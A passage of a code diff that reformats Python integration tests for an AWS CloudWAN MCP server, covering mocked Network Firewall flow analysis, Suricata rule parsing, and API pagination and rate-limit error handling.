-                    "production-firewall", src_ip, dst_ip, protocol, src_port, dst_port
-                ))
-            
+                tasks.append(
+                    analyze_five_tuple_flow("production-firewall", src_ip, dst_ip, protocol, src_port, dst_port)
+                )
+
             # Execute all tasks concurrently
             results = await asyncio.gather(*tasks, return_exceptions=True)
-            
+
             # All operations should succeed (no exceptions)
             successful_results = []
             for result in results:
@@ -416,15 +459,15 @@
                     data = json.loads(result)
                     assert data["success"] is True
                     successful_results.append(data)
-            
+
             # Should have completed all tasks
             assert len(successful_results) == len(tasks)
-    
+
     @pytest.mark.asyncio
     async def test_anfw_complex_rule_parsing(self, comprehensive_firewall_setup):
         """Test ANFW complex Suricata rule parsing scenarios."""
         nfw_client, logs_client = comprehensive_firewall_setup
-        
+
         # Add complex rule group with advanced Suricata features
         complex_rules = {
             "RuleGroup": {
@@ -448,46 +491,53 @@
                 }
             }
         }
-        
+
         # Override rule group response for this test
         nfw_client.describe_rule_group.return_value = complex_rules
-        
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client', return_value=nfw_client):
+
+        with patch(
+            "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client",
+            return_value=nfw_client,
+        ):
             result = await parse_suricata_rules("production-firewall", analyze_l7_rules=True)
             data = json.loads(result)
-            
+
             assert data["success"] is True
             assert len(data["parsed_rules"]) > 0
-            
+
             # Should detect application protocols
             l7_analysis = data["l7_analysis"]
             assert "application_protocols" in l7_analysis
             assert "HTTP" in l7_analysis["application_protocols"]
             assert "TLS/SSL" in l7_analysis["application_protocols"]
             assert "DNS" in l7_analysis["application_protocols"]
-            
+
             # Should have security analysis
             security_analysis = l7_analysis["security_analysis"]
             assert security_analysis["alert_rules"] > 0
             assert security_analysis["drop_rules"] > 0
-    
+
     @pytest.mark.asyncio
     async def test_anfw_integration_with_cloudwan_path_tracing(self, comprehensive_firewall_setup):
         """Test ANFW integration with CloudWAN path tracing."""
         nfw_client, logs_client = comprehensive_firewall_setup
-        
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client', return_value=nfw_client), \
-             patch('awslabs.cloudwan_mcp_server.tools.network_analysis.NetworkAnalysisTools') as mock_path_tools:
-            
+
+        with (
+            patch(
+                "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client",
+                return_value=nfw_client,
+            ),
+            patch("awslabs.cloudwan_mcp_server.tools.network_analysis.NetworkAnalysisTools") as mock_path_tools,
+        ):
             # Configure mock path tracing tools
             mock_path_instance = Mock()
             mock_path_tools.return_value = mock_path_instance
-            
+
             result = await analyze_five_tuple_flow(
                 "production-firewall", "10.0.1.100", "172.16.2.200", "TCP", 12345, 80
             )
             data = json.loads(result)
-            
+
             assert data["success"] is True
             assert "path_integration" in data["flow_analysis"]
             assert data["flow_analysis"]["path_integration"]["path_trace_available"] is True
@@ -497,75 +547,81 @@
 @pytest.mark.slow
 class TestANFWLongRunningOperations:
     """Integration tests for ANFW long-running operations."""
-    
+
     @pytest.mark.asyncio
     async def test_extended_log_monitoring(self):
         """Test extended log monitoring with large time ranges."""
         # Mock for extended time range monitoring
         logs_client = Mock()
-        
+
         # Simulate large result set
         large_results = []
         for i in range(100):  # 100 log entries
-            large_results.append([
-                {"field": "@timestamp", "value": f"2023-01-01T12:{i:02d}:00.000Z"},
-                {"field": "@message", "value": f"FLOW srcaddr=10.0.1.{i} dstaddr=172.16.2.200 srcport={12000+i} dstport=80 protocol=6 action=ALLOW"}
-            ])
-        
+            large_results.append(
+                [
+                    {"field": "@timestamp", "value": f"2023-01-01T12:{i:02d}:00.000Z"},
+                    {
+                        "field": "@message",
+                        "value": f"FLOW srcaddr=10.0.1.{i} dstaddr=172.16.2.200 srcport={12000 + i} dstport=80 protocol=6 action=ALLOW",
+                    },
+                ]
+            )
+
         logs_client.start_query.return_value = {"queryId": "long-running-query-123"}
-        logs_client.get_query_results.return_value = {
-            "status": "Complete",
-            "results": large_results
-        }
-        
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_logs_client', return_value=logs_client):
+        logs_client.get_query_results.return_value = {"status": "Complete", "results": large_results}
+
+        with patch(
+            "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_logs_client",
+            return_value=logs_client,
+        ):
             result = await monitor_anfw_logs("production-firewall", "flow", 1440)  # 24 hours
             data = json.loads(result)
-            
+
             assert data["success"] is True
             assert len(data["log_entries"]) == 100
             assert data["analysis"]["total_entries"] == 100
-    
+
     @pytest.mark.asyncio
     async def test_comprehensive_policy_simulation(self):
         """Test comprehensive policy simulation with many flows."""
         nfw_client = Mock()
-        
+
         # Mock comprehensive firewall setup
         nfw_client.describe_firewall.return_value = {
             "Firewall": {
                 "FirewallName": "comprehensive-firewall",
                 "FirewallArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall/comprehensive-firewall",
-                "FirewallPolicyArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall-policy/comprehensive-policy"
+                "FirewallPolicyArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall-policy/comprehensive-policy",
             }
         }
-        
+
         nfw_client.describe_firewall_policy.return_value = {
             "FirewallPolicy": {
                 "StatelessRuleGroups": [],
                 "StatefulRuleGroups": [],
                 "StatelessDefaultActions": ["aws:drop"],
-                "StatelessFragmentDefaultActions": ["aws:drop"]
+                "StatelessFragmentDefaultActions": ["aws:drop"],
             }
         }
-        
+
         # Generate many test flows
         test_flows = []
         for i in range(50):
-            test_flows.append(f"10.0.1.{i}:{12000+i}->172.16.2.200:80/TCP")
-            test_flows.append(f"10.0.1.{i}:{13000+i}->172.16.2.200:443/TCP")
-        
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client', return_value=nfw_client):
+            test_flows.append(f"10.0.1.{i}:{12000 + i}->172.16.2.200:80/TCP")
+            test_flows.append(f"10.0.1.{i}:{13000 + i}->172.16.2.200:443/TCP")
+
+        with patch(
+            "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client",
+            return_value=nfw_client,
+        ):
             result = await simulate_policy_changes(
-                "comprehensive-firewall",
-                "Comprehensive security policy update",
-                test_flows
+                "comprehensive-firewall", "Comprehensive security policy update", test_flows
             )
             data = json.loads(result)
-            
+
             assert data["success"] is True
             assert data["simulation_result"]["impact_analysis"]["flows_analyzed"] == 100
 
 
 if __name__ == "__main__":
-    pytest.main([__file__, "-v", "--tb=short"])
\ No newline at end of file
+    pytest.main([__file__, "-v", "--tb=short"])

--- cloudwan-mcp-server/tests/integration/test_pagination_rate_limiting.py
+++ cloudwan-mcp-server/tests/integration/test_pagination_rate_limiting.py
@@ -38,35 +38,39 @@
         # Generate mock data for 1200 core networks across 3 pages
         page_1_networks = [
             {
-                'CoreNetworkId': f'core-network-{i:05d}',
-                'GlobalNetworkId': f'global-network-{i:05d}',
-                'State': 'AVAILABLE' if i % 2 == 0 else 'UPDATING',
-                'Description': f'Core network {i}',
-                'CreatedAt': datetime(2024, 1, 15, 10, 30, 45, tzinfo=timezone.utc)
-            } for i in range(500)
+                "CoreNetworkId": f"core-network-{i:05d}",
+                "GlobalNetworkId": f"global-network-{i:05d}",
+                "State": "AVAILABLE" if i % 2 == 0 else "UPDATING",
+                "Description": f"Core network {i}",
+                "CreatedAt": datetime(2024, 1, 15, 10, 30, 45, tzinfo=timezone.utc),
+            }
+            for i in range(500)
         ]
 
         page_2_networks = [
             {
-                'CoreNetworkId': f'core-network-{i:05d}',
-                'GlobalNetworkId': f'global-network-{i:05d}',
-                'State': 'AVAILABLE',
-                'Description': f'Core network {i}',
-                'CreatedAt': datetime(2024, 1, 15, 10, 30, 45, tzinfo=timezone.utc)
-            } for i in range(500, 1000)
+                "CoreNetworkId": f"core-network-{i:05d}",
+                "GlobalNetworkId": f"global-network-{i:05d}",
+                "State": "AVAILABLE",
+                "Description": f"Core network {i}",
+                "CreatedAt": datetime(2024, 1, 15, 10, 30, 45, tzinfo=timezone.utc),
+            }
+            for i in range(500, 1000)
         ]
 
         page_3_networks = [
             {
-                'CoreNetworkId': f'core-network-{i:05d}',
-                'GlobalNetworkId': f'global-network-{i:05d}',
-                'State': 'AVAILABLE',
-                'Description': f'Core network {i}',
-                'CreatedAt': datetime(2024, 1, 15, 10, 30, 45, tzinfo=timezone.utc)
-            } for i in range(1000, 1200)
+                "CoreNetworkId": f"core-network-{i:05d}",
+                "GlobalNetworkId": f"global-network-{i:05d}",
+                "State": "AVAILABLE",
+                "Description": f"Core network {i}",
+                "CreatedAt": datetime(2024, 1, 15, 10, 30, 45, tzinfo=timezone.utc),
+            }
+            for i in range(1000, 1200)
         ]
 
         call_count = 0
+
         def create_pagination_mock_factory(service, region=None):
             nonlocal call_count
             mock_client = Mock()
@@ -75,60 +79,54 @@
                 nonlocal call_count
                 call_count += 1
 
-                if 'NextToken' not in kwargs:
+                if "NextToken" not in kwargs:
                     # First page
-                    return {
-                        'CoreNetworks': page_1_networks,
-                        'NextToken': 'token-page-2'
-                    }
-                elif kwargs['NextToken'] == 'token-page-2':
+                    return {"CoreNetworks": page_1_networks, "NextToken": "token-page-2"}
+                elif kwargs["NextToken"] == "token-page-2":
                     # Second page
-                    return {
-                        'CoreNetworks': page_2_networks,
-                        'NextToken': 'token-page-3'
-                    }
-                elif kwargs['NextToken'] == 'token-page-3':
+                    return {"CoreNetworks": page_2_networks, "NextToken": "token-page-3"}
+                elif kwargs["NextToken"] == "token-page-3":
                     # Third page (final)
                     return {
-                        'CoreNetworks': page_3_networks
+                        "CoreNetworks": page_3_networks
                         # No NextToken = end of results
                     }
                 else:
-                    return {'CoreNetworks': []}
+                    return {"CoreNetworks": []}
 
             mock_client.list_core_networks.side_effect = list_core_networks_side_effect
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=create_pagination_mock_factory):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=create_pagination_mock_factory):
             result = await list_core_networks()
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
+            assert parsed["success"] is True
 
             # Test should verify all pages are processed, not just first page
             # If implementation supports full pagination, should return all 1200 items
             # If only first page, verify pagination metadata is present
-            if 'total_count' in parsed:
-                if parsed['total_count'] == 1200:
+            if "total_count" in parsed:
+                if parsed["total_count"] == 1200:
                     # Full pagination implemented
-                    assert len(parsed['core_networks']) == 1200
+                    assert len(parsed["core_networks"]) == 1200
                     # Verify items from all three pages are present
-                    core_network_ids = [net['CoreNetworkId'] for net in parsed['core_networks']]
-                    assert 'core-network-00000' in core_network_ids  # First page
-                    assert 'core-network-00500' in core_network_ids  # Second page
-                    assert 'core-network-01000' in core_network_ids  # Third page
+                    core_network_ids = [net["CoreNetworkId"] for net in parsed["core_networks"]]
+                    assert "core-network-00000" in core_network_ids  # First page
+                    assert "core-network-00500" in core_network_ids  # Second page
+                    assert "core-network-01000" in core_network_ids  # Third page
                 else:
                     # First page only - should include pagination metadata
-                    assert parsed['total_count'] == 500
-                    assert len(parsed['core_networks']) == 500
+                    assert parsed["total_count"] == 500
+                    assert len(parsed["core_networks"]) == 500
                     # Should indicate more results available
-                    assert 'has_more_pages' in parsed or 'next_token' in parsed
+                    assert "has_more_pages" in parsed or "next_token" in parsed
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_describe_global_networks_token_cycling(self):
         """Test DescribeGlobalNetworks with NextToken cycling and validation."""
-        token_sequence = ['token-1', 'token-2', 'token-3', None]
+        token_sequence = ["token-1", "token-2", "token-3", None]
         call_count = 0
 
         def token_cycling_mock(service, region=None):
@@ -137,7 +135,7 @@
 
             def describe_global_networks_side_effect(**kwargs):
                 nonlocal call_count
-                current_token = kwargs.get('NextToken')
+                current_token = kwargs.get("NextToken")
                 call_count += 1
 
                 # Validate token sequence
@@ -146,27 +144,28 @@
 
                 networks = [
                     {
-                        'GlobalNetworkId': f'global-network-page-{call_count}-{i}',
-                        'State': 'AVAILABLE',
-                        'Description': f'Network {i} on page {call_count}'
-                    } for i in range(100)
+                        "GlobalNetworkId": f"global-network-page-{call_count}-{i}",
+                        "State": "AVAILABLE",
+                        "Description": f"Network {i} on page {call_count}",
+                    }
+                    for i in range(100)
                 ]
 
-                response = {'GlobalNetworks': networks}
+                response = {"GlobalNetworks": networks}
                 if call_count < len(token_sequence):
-                    response['NextToken'] = token_sequence[call_count]
+                    response["NextToken"] = token_sequence[call_count]
 
                 return response
 
             mock_client.describe_global_networks.side_effect = describe_global_networks_side_effect
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=token_cycling_mock):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=token_cycling_mock):
             result = await get_global_networks()
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['total_count'] == 100  # Current implementation returns first page
+            assert parsed["success"] is True
+            assert parsed["total_count"] == 100  # Current implementation returns first page
             assert call_count == 1  # Current implementation makes one call
 
     @pytest.mark.integration
@@ -174,22 +173,15 @@
     async def test_search_transit_gateway_routes_page_handling(self):
         """Test SearchTransitGatewayRoutes with complex pagination scenarios."""
         routes_page_1 = [
-            {
-                'DestinationCidrBlock': f'10.{i}.0.0/16',
-                'State': 'active',
-                'Type': 'propagated'
-            } for i in range(100)
+            {"DestinationCidrBlock": f"10.{i}.0.0/16", "State": "active", "Type": "propagated"} for i in range(100)
         ]
 
         routes_page_2 = [
-            {
-                'DestinationCidrBlock': f'172.16.{i}.0/24',
-                'State': 'active',
-                'Type': 'static'
-            } for i in range(100)
+            {"DestinationCidrBlock": f"172.16.{i}.0/24", "State": "active", "Type": "static"} for i in range(100)
         ]
 
         call_count = 0
+
         def create_route_pagination_mock_factory(service, region=None):
             nonlocal call_count
             mock_client = Mock()
@@ -199,26 +191,22 @@
                 call_count += 1
 
                 if call_count == 1:
-                    return {
-                        'Routes': routes_page_1,
-                        'AdditionalRoutesAvailable': True
-                    }
+                    return {"Routes": routes_page_1, "AdditionalRoutesAvailable": True}
                 else:
-                    return {
-                        'Routes': routes_page_2,
-                        'AdditionalRoutesAvailable': False
-                    }
+                    return {"Routes": routes_page_2, "AdditionalRoutesAvailable": False}
 
             mock_client.search_transit_gateway_routes.side_effect = search_routes_side_effect
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=create_route_pagination_mock_factory):
-            result = await analyze_tgw_routes('tgw-rtb-123456789')
+        with patch(
+            "awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=create_route_pagination_mock_factory
+        ):
+            result = await analyze_tgw_routes("tgw-rtb-123456789")
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['analysis']['total_routes'] == 100  # Current implementation uses first page
-            assert len(parsed['analysis']['route_details']) == 100
+            assert parsed["success"] is True
+            assert parsed["analysis"]["total_routes"] == 100  # Current implementation uses first page
+            assert len(parsed["analysis"]["route_details"]) == 100
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -227,63 +215,60 @@
         max_results_scenarios = [1, 50, 100, 500, 1000]  # AWS typical limits
 
         for max_results in max_results_scenarios:
-            with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+            with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
                 mock_client = Mock()
 
                 # Generate exact number of results as requested
                 networks = [
-                    {
-                        'CoreNetworkId': f'core-network-{i:05d}',
-                        'State': 'AVAILABLE'
-                    } for i in range(max_results)
+                    {"CoreNetworkId": f"core-network-{i:05d}", "State": "AVAILABLE"} for i in range(max_results)
                 ]
 
                 mock_client.list_core_networks.return_value = {
-                    'CoreNetworks': networks,
-                    'NextToken': 'has-more' if max_results < 1000 else None
+                    "CoreNetworks": networks,
+                    "NextToken": "has-more" if max_results < 1000 else None,
                 }
                 mock_get_client.return_value = mock_client
 
                 result = await list_core_networks()
 
                 parsed = json.loads(result)
-                assert parsed['success'] is True
-                assert len(parsed['core_networks']) == max_results
-                assert parsed['total_count'] == max_results
+                assert parsed["success"] is True
+                assert len(parsed["core_networks"]) == max_results
+                assert parsed["total_count"] == max_results
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_invalid_next_token_handling(self):
         """Test handling of invalid or expired NextToken values."""
         invalid_tokens = [
-            'expired-token-12345',
-            'malformed-token',
-            'token-from-different-operation',
-            'base64-invalid-token',
-            ''  # Empty token
+            "expired-token-12345",
+            "malformed-token",
+            "token-from-different-operation",
+            "base64-invalid-token",
+            "",  # Empty token
         ]
 
         for invalid_token in invalid_tokens:
-            with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+            with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
                 mock_client = Mock()
                 mock_client.list_core_networks.side_effect = ClientError(
                     {
-                        'Error': {
-                            'Code': 'InvalidNextToken',
-                            'Message': f'Invalid NextToken: {invalid_token}',
-                            'InvalidParameter': 'NextToken'
+                        "Error": {
+                            "Code": "InvalidNextToken",
+                            "Message": f"Invalid NextToken: {invalid_token}",
+                            "InvalidParameter": "NextToken",
                         }
                     },
-                    'ListCoreNetworks'
+                    "ListCoreNetworks",
                 )
                 mock_get_client.return_value = mock_client
 
                 result = await list_core_networks()
 
                 parsed = json.loads(result)
-                assert parsed['success'] is False
-                assert parsed['error_code'] == 'InvalidNextToken'
-                assert invalid_token in parsed['error'] or 'NextToken' in parsed['error']
+                assert parsed["success"] is False
+                assert parsed["error_code"] == "InvalidNextToken"
+                assert invalid_token in parsed["error"] or "NextToken" in parsed["error"]
 
 
 class TestRateLimitingScenarios:
@@ -293,35 +278,32 @@
     @pytest.mark.asyncio
     async def test_rate_limit_exhaustion_patterns(self):
         """Test rate limit exhaustion with detailed retry-after headers."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.list_core_networks.side_effect = ClientError(
                 {
-                    'Error': {
-                        'Code': 'TooManyRequestsException',
-                        'Message': 'Request rate exceeded. Retry after 10 seconds',
-                        'RetryAfterSeconds': 10,
-                        'QuotaCode': 'L-12345678',
-                        'ServiceCode': 'networkmanager'
+                    "Error": {
+                        "Code": "TooManyRequestsException",
+                        "Message": "Request rate exceeded. Retry after 10 seconds",
+                        "RetryAfterSeconds": 10,
+                        "QuotaCode": "L-12345678",
+                        "ServiceCode": "networkmanager",
+                    },
+                    "ResponseMetadata": {
+                        "HTTPStatusCode": 429,
+                        "HTTPHeaders": {"retry-after": "10", "x-amzn-requestid": "req-rate-limit-123"},
                     },
-                    'ResponseMetadata': {
-                        'HTTPStatusCode': 429,
-                        'HTTPHeaders': {
-                            'retry-after': '10',
-                            'x-amzn-requestid': 'req-rate-limit-123'
-                        }
-                    }
                 },
-                'ListCoreNetworks'
+                "ListCoreNetworks",
             )
             mock_get_client.return_value = mock_client
 
             result = await list_core_networks()
 
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert parsed['error_code'] == 'TooManyRequestsException'
-            assert 'Retry after 10 seconds' in parsed['error']
+            assert parsed["success"] is False
+            assert parsed["error_code"] == "TooManyRequestsException"
+            assert "Retry after 10 seconds" in parsed["error"]
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -341,35 +323,35 @@
 
                 if retry_count <= 3:
                     # Simulate increasing retry delays
-                    delay = 2 ** retry_count  # Exponential: 2, 4, 8 seconds
+                    delay = 2**retry_count  # Exponential: 2, 4, 8 seconds
                     retry_delays.append(delay)
 
                     raise ClientError(
                         {
-                            'Error': {
-                                'Code': 'TooManyRequestsException',
-                                'Message': f'Rate limit exceeded (attempt {retry_count})',
-                                'RetryAfterSeconds': delay
+                            "Error": {
+                                "Code": "TooManyRequestsException",
+                                "Message": f"Rate limit exceeded (attempt {retry_count})",
+                                "RetryAfterSeconds": delay,
                             }
                         },
-                        'ListCoreNetworks'
+                        "ListCoreNetworks",
                     )
                 else:
                     # Fourth attempt succeeds
-                    return {'CoreNetworks': [{'CoreNetworkId': 'core-network-retry-success'}]}
+                    return {"CoreNetworks": [{"CoreNetworkId": "core-network-retry-success"}]}
 
             mock_client.list_core_networks.side_effect = list_with_retry
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=adaptive_retry_mock):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=adaptive_retry_mock):
             result = await list_core_networks()
 
             if retry_count <= 3:
                 # Current implementation doesn't retry, so first call fails
                 parsed = json.loads(result)
-                assert parsed['success'] is False
-                assert parsed['error_code'] == 'TooManyRequestsException'
-                assert 'Rate limit exceeded (attempt 1)' in parsed['error']
+                assert parsed["success"] is False
+                assert parsed["error_code"] == "TooManyRequestsException"
+                assert "Rate limit exceeded (attempt 1)" in parsed["error"]
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -377,44 +359,44 @@
         """Test ServiceQuotaExceededException with detailed quota information."""
         quota_scenarios = [
             {
-                'quota_code': 'L-CWN-CORES',
-                'quota_name': 'Core Networks per Region',
-                'current_usage': 50,
-                'quota_value': 50
+                "quota_code": "L-CWN-CORES",
+                "quota_name": "Core Networks per Region",
+                "current_usage": 50,
+                "quota_value": 50,
             },
             {
-                'quota_code': 'L-CWN-POLICIES',
-                'quota_name': 'Core Network Policies per Core Network',
-                'current_usage': 20,
-                'quota_value': 20
-            }
+                "quota_code": "L-CWN-POLICIES",
+                "quota_name": "Core Network Policies per Core Network",
+                "current_usage": 20,
+                "quota_value": 20,
+            },
         ]
 
         for scenario in quota_scenarios:
-            with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+            with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
                 mock_client = Mock()
                 mock_client.list_core_networks.side_effect = ClientError(
                     {
-                        'Error': {
-                            'Code': 'ServiceQuotaExceededException',
-                            'Message': f'Quota exceeded for {scenario["quota_name"]}',
-                            'QuotaCode': scenario['quota_code'],
-                            'ServiceCode': 'networkmanager',
-                            'ResourceType': 'core-network',
-                            'CurrentUsage': scenario['current_usage'],
-                            'AllowedUsage': scenario['quota_value']
+                        "Error": {
+                            "Code": "ServiceQuotaExceededException",
+                            "Message": f"Quota exceeded for {scenario['quota_name']}",
+                            "QuotaCode": scenario["quota_code"],
+                            "ServiceCode": "networkmanager",
+                            "ResourceType": "core-network",
+                            "CurrentUsage": scenario["current_usage"],
+                            "AllowedUsage": scenario["quota_value"],
                         }
                     },
-                    'ListCoreNetworks'
+                    "ListCoreNetworks",
                 )
                 mock_get_client.return_value = mock_client
 
                 result = await list_core_networks()
 
                 parsed = json.loads(result)
-                assert parsed['success'] is False
-                assert parsed['error_code'] == 'ServiceQuotaExceededException'
-                assert scenario['quota_name'] in parsed['error']
+                assert parsed["success"] is False
+                assert parsed["error_code"] == "ServiceQuotaExceededException"
+                assert scenario["quota_name"] in parsed["error"]
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -438,34 +420,34 @@
                 if len(request_timestamps) >= burst_capacity:
                     raise ClientError(
                         {
-                            'Error': {
-                                'Code': 'TooManyRequestsException',
-                                'Message': 'Burst capacity exceeded',
-                                'BurstCapacity': burst_capacity,
-                                'SustainedRate': sustained_rate
+                            "Error": {
+                                "Code": "TooManyRequestsException",
+                                "Message": "Burst capacity exceeded",
+                                "BurstCapacity": burst_capacity,
+                                "SustainedRate": sustained_rate,
                             }
                         },
-                        'ListCoreNetworks'
+                        "ListCoreNetworks",
                     )
 
-                return {'CoreNetworks': []}
+                return {"CoreNetworks": []}
 
             mock_client.list_core_networks.side_effect = rate_limited_call
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=burst_capacity_mock):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=burst_capacity_mock):
             # Make requests within burst capacity
             for i in range(burst_capacity):
                 result = await list_core_networks()
                 parsed = json.loads(result)
-                assert parsed['success'] is True
+                assert parsed["success"] is True
 
             # Next request should trigger rate limiting
             result = await list_core_networks()
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert parsed['error_code'] == 'TooManyRequestsException'
-            assert 'Burst capacity exceeded' in parsed['error']
+            assert parsed["success"] is False
+            assert parsed["error_code"] == "TooManyRequestsException"
+            assert "Burst capacity exceeded" in parsed["error"]
 
 
 class TestPaginationWithErrorHandling:
@@ -488,29 +470,27 @@
                 if call_count == 1:
                     # First page succeeds
                     return {
-                        'CoreNetworks': [
-                            {'CoreNetworkId': f'core-network-{i}', 'State': 'AVAILABLE'}
-                            for i in range(100)
+                        "CoreNetworks": [
+                            {"CoreNetworkId": f"core-network-{i}", "State": "AVAILABLE"} for i in range(100)
                         ],
-                        'NextToken': 'token-page-2'
+                        "NextToken": "token-page-2",
                     }
                 elif call_count == 2:
                     # Second page encounters throttling
                     raise ClientError(
                         {
-                            'Error': {
-                                'Code': 'ThrottlingException',
-                                'Message': 'Request rate exceeded during pagination'
+                            "Error": {
+                                "Code": "ThrottlingException",
+                                "Message": "Request rate exceeded during pagination",
                             }
                         },
-                        'ListCoreNetworks'
+                        "ListCoreNetworks",
                     )
                 else:
                     # Subsequent pages succeed after retry
                     return {
-                        'CoreNetworks': [
-                            {'CoreNetworkId': f'core-network-page2-{i}', 'State': 'AVAILABLE'}
-                            for i in range(50)
+                        "CoreNetworks": [
+                            {"CoreNetworkId": f"core-network-page2-{i}", "State": "AVAILABLE"} for i in range(50)
                         ]
                         # No NextToken = end of results
                     }
@@ -518,13 +498,13 @@
             mock_client.list_core_networks.side_effect = mixed_pagination_call
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=mixed_response_mock):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=mixed_response_mock):
             result = await list_core_networks()
 
             # Current implementation only makes one call, so first page succeeds
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['total_count'] == 100
+            assert parsed["success"] is True
+            assert parsed["total_count"] == 100
             assert call_count == 1
 
     @pytest.mark.integration
@@ -540,38 +520,37 @@
             def concurrent_mod_call(**kwargs):
                 nonlocal modification_detected
 
-                if 'NextToken' in kwargs and not modification_detected:
+                if "NextToken" in kwargs and not modification_detected:
                     # Detect concurrent modification on second page
                     modification_detected = True
                     raise ClientError(
                         {
-                            'Error': {
-                                'Code': 'ConcurrentModificationException',
-                                'Message': 'Data was modified during pagination',
-                                'ConflictingOperation': 'CreateCoreNetwork',
-                                'RecommendedAction': 'Restart pagination from beginning'
+                            "Error": {
+                                "Code": "ConcurrentModificationException",
+                                "Message": "Data was modified during pagination",
+                                "ConflictingOperation": "CreateCoreNetwork",
+                                "RecommendedAction": "Restart pagination from beginning",
                             }
                         },
-                        'ListCoreNetworks'
+                        "ListCoreNetworks",
                     )
                 else:
                     return {
-                        'CoreNetworks': [
-                            {'CoreNetworkId': f'core-network-stable-{i}', 'State': 'AVAILABLE'}
-                            for i in range(100)
+                        "CoreNetworks": [
+                            {"CoreNetworkId": f"core-network-stable-{i}", "State": "AVAILABLE"} for i in range(100)
                         ],
-                        'NextToken': 'stable-token' if not modification_detected else None
+                        "NextToken": "stable-token" if not modification_detected else None,
                     }
 
             mock_client.list_core_networks.side_effect = concurrent_mod_call
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=concurrent_modification_mock):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=concurrent_modification_mock):
             result = await list_core_networks()
 
             parsed = json.loads(result)
-            assert parsed['success'] is True  # First page succeeds
-            assert parsed['total_count'] == 100
+            assert parsed["success"] is True  # First page succeeds
+            assert parsed["total_count"] == 100
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -587,41 +566,38 @@
                 nonlocal cache_version
 
                 # Simulate cache invalidation every 3 calls
-                if 'NextToken' in kwargs:
+                if "NextToken" in kwargs:
                     cache_version += 1
                     if cache_version % 3 == 0:
                         raise ClientError(
                             {
-                                'Error': {
-                                    'Code': 'InvalidNextToken',
-                                    'Message': 'NextToken expired due to cache invalidation',
-                                    'Reason': 'CacheInvalidation',
-                                    'CacheVersion': cache_version
+                                "Error": {
+                                    "Code": "InvalidNextToken",
+                                    "Message": "NextToken expired due to cache invalidation",
+                                    "Reason": "CacheInvalidation",
+                                    "CacheVersion": cache_version,
                                 }
                             },
-                            'ListCoreNetworks'
+                            "ListCoreNetworks",
                         )
 
                 return {
-                    'CoreNetworks': [
-                        {
-                            'CoreNetworkId': f'core-network-v{cache_version}-{i}',
-                            'State': 'AVAILABLE'
-                        } for i in range(50)
+                    "CoreNetworks": [
+                        {"CoreNetworkId": f"core-network-v{cache_version}-{i}", "State": "AVAILABLE"} for i in range(50)
                     ],
-                    'NextToken': f'token-v{cache_version}-next' if cache_version < 5 else None
+                    "NextToken": f"token-v{cache_version}-next" if cache_version < 5 else None,
                 }
 
             mock_client.list_core_networks.side_effect = cached_pagination_call
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=cache_invalidation_mock):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=cache_invalidation_mock):
             result = await list_core_networks()
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert len(parsed['core_networks']) == 50
-            assert all('v1' in network['CoreNetworkId'] for network in parsed['core_networks'])
+            assert parsed["success"] is True
+            assert len(parsed["core_networks"]) == 50
+            assert all("v1" in network["CoreNetworkId"] for network in parsed["core_networks"])
 
 
 class TestCrossRegionPaginationChallenges:
@@ -632,72 +608,69 @@
